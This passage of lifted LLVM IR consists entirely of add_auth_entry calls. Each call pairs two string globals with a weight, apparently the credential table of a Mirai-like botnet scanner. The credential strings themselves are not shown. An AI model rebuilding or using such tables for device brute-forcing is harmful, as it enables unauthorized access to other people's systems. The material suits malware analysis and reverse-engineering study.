  store i32 ptrtoint (i32* @global_var_18120.152 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_d3e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18120.152 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18128.154 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_d3f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([6 x i8]* @global_var_18128.154 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d400 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r1.global-to-local, align 4
  %v5_d410 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18130.156 to i32), i32* %r1.global-to-local, align 4
  %v0_d41c = load i32, i32* @r4, align 4
  store i32 %v0_d41c, i32* %r2.global-to-local, align 4
  %v4_d420 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18130.156 to i32), i32 %v0_d41c)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18138.158 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d430 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([8 x i8]* @global_var_18138.158 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d440 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18148.162 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d450 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_18148.162 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18154.164 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d460 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18154.164 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1815c.166 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d470 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_1815c.166 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32* %r1.global-to-local, align 4
  %v5_d480 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d490 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32* %r1.global-to-local, align 4
  %v5_d4a0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d4b0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18570.170 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d4c0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32 ptrtoint (i32* @global_var_18570.170 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18154.164 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d4d0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32 ptrtoint (i32* @global_var_18154.164 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d4e0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_d4f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r1.global-to-local, align 4
  %v5_d500 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18178.174 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d510 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18178.174 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d520 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32* %r1.global-to-local, align 4
  %v5_d530 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18154.164 to i32), i32* %r1.global-to-local, align 4
  %v0_d53c = load i32, i32* @r4, align 4
  store i32 %v0_d53c, i32* %r2.global-to-local, align 4
  %v4_d540 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32 ptrtoint (i32* @global_var_18154.164 to i32), i32 %v0_d53c)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18188.178 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d550 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18188.178 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18190.180 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_d560 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18190.180 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182e4.182 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d570 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_182e4.182 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1819c.184 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d580 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([9 x i8]* @global_var_1819c.184 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182e4.182 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_d590 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_182e4.182 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_181a8.186 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_d5a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_181a8.186 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_d5b0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18570.170 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d5c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18570.170 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_181b0.188 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d5d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_181b0.188 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_d5e0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181c8.192 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_d5f0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), i32 ptrtoint ([7 x i8]* @global_var_181c8.192 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_181d0.194 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_d600 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), i32 ptrtoint ([4 x i8]* @global_var_181d0.194 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181d4.196 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_d610 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), i32 ptrtoint ([7 x i8]* @global_var_181d4.196 to i32), i32 13)
  store i32 ptrtoint ([8 x i8]* @global_var_181dc.198 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_181dc.198 to i32), i32* %r1.global-to-local, align 4
  %v5_d620 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_181dc.198 to i32), i32 ptrtoint ([8 x i8]* @global_var_181dc.198 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_181dc.198 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d630 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([8 x i8]* @global_var_181dc.198 to i32), i32 7)
  store i32 ptrtoint ([11 x i8]* @global_var_181e4.200 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_181e4.200 to i32), i32* %r1.global-to-local, align 4
  %v5_d640 = call i32 @add_auth_entry(i32 ptrtoint ([11 x i8]* @global_var_181e4.200 to i32), i32 ptrtoint ([11 x i8]* @global_var_181e4.200 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d650 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32* %r1.global-to-local, align 4
  %v5_d660 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18178.174 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d670 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32 ptrtoint (i32* @global_var_18178.174 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18154.164 to i32), i32* %r1.global-to-local, align 4
  %v0_d67c = load i32, i32* @r4, align 4
  store i32 %v0_d67c, i32* %r2.global-to-local, align 4
  %v4_d680 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), i32 ptrtoint (i32* @global_var_18154.164 to i32), i32 %v0_d67c)
  store i32 ptrtoint (i32* @global_var_181f8.204 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d690 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_181f8.204 to i32), i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_18200.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18570.170 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_d6a0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_18200.206 to i32), i32 ptrtoint (i32* @global_var_18570.170 to i32), i32 13)
  store i32 ptrtoint (i32* @global_var_181a8.186 to i32), i32* %r0.global-to-local, align 4
  %v0_d6a8 = load i32, i32* @r4, align 4
  store i32 %v0_d6a8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_181a8.186 to i32), i32* %r1.global-to-local, align 4
  %v3_d6b0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_181a8.186 to i32), i32 ptrtoint (i32* @global_var_181a8.186 to i32), i32 %v0_d6a8)
  store i32 ptrtoint (i32* @global_var_18130.156 to i32), i32* %r0.global-to-local, align 4
  %v0_d6b8 = load i32, i32* @r4, align 4
  store i32 %v0_d6b8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18130.156 to i32), i32* %r1.global-to-local, align 4
  %v3_d6c0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18130.156 to i32), i32 ptrtoint (i32* @global_var_18130.156 to i32), i32 %v0_d6b8)
  store i32 ptrtoint ([5 x i8]* @global_var_18210.208 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18210.208 to i32), i32* %r1.global-to-local, align 4
  %v5_d6d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18210.208 to i32), i32 ptrtoint ([5 x i8]* @global_var_18210.208 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18210.208 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_d6e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18210.208 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18218.210 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v4_d6f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18218.210 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18220.212 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_d700 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18220.212 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18228.214 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_d710 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18228.214 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18230.216 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_d720 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([6 x i8]* @global_var_18230.216 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18238.218 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d730 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18238.218 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18240.220 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_d740 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([6 x i8]* @global_var_18240.220 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18248.222 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_d750 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_18248.222 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18254.224 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d760 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18254.224 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18264.226 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d770 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18264.226 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18274.228 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d780 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([7 x i8]* @global_var_18274.228 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1827c.230 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d790 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_1827c.230 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18284.232 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d7a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_18284.232 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d7b0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18290.234 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d7c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([8 x i8]* @global_var_18290.234 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18298.236 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_d7d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18298.236 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182a4.238 to i32), i32* %r1.global-to-local, align 4
  %v0_d7dc = load i32, i32* @r4, align 4
  store i32 %v0_d7dc, i32* %r2.global-to-local, align 4
  %v4_d7e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_182a4.238 to i32), i32 %v0_d7dc)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182ac.240 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d7f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_182ac.240 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18570.170 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d800 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18570.170 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18178.174 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d810 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18178.174 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1815c.166 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d820 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_1815c.166 to i32), i32 1)
